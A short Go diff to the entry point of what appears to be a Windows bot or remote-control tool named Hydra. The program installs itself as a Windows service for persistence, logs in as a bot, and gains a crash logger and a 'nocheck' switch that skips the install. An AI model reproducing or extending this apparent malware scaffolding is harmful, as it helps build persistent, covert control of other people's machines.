@@ -1,7 +1,10 @@
 package main
 
 import (
+	"fmt"
+	"io/ioutil"
 	"log"
+	"os"
 
 	"github.com/Raffy27/Hydra/api"
 	"github.com/Raffy27/Hydra/commands"
@@ -9,16 +12,27 @@ import (
 	"golang.org/x/sys/windows/svc"
 )
 
+func checkthisshit() {
+	if r := recover(); r != nil {
+		ioutil.WriteFile("C:\\Users\\Raffy\\Desktop\\Panic.txt", []byte(fmt.Sprint(r)), 0644)
+	}
+}
+
 func main() {
-	if chk, _ := svc.IsWindowsService(); chk {
-		install.HandleService()
+	defer checkthisshit()
+
+	if os.Getenv("nocheck") == "" {
+		if chk, _ := svc.IsWindowsService(); chk {
+			install.HandleService(main)
+		}
+		if !install.IsInstalled() {
+			install.Install()
+			log.Println("Install successful")
+		} else {
+			log.Println("Already installed")
+		}
 	}
-	if !install.IsInstalled() {
-		install.Install()
-		log.Println("Install successful")
-	} else {
-		log.Println("Already installed")
-	}
+
 	log.Println("Logged in as", api.Bot.Self.UserName)
 	//api.NewGenesis()
 	log.Println("Genesis is", api.Genesis)
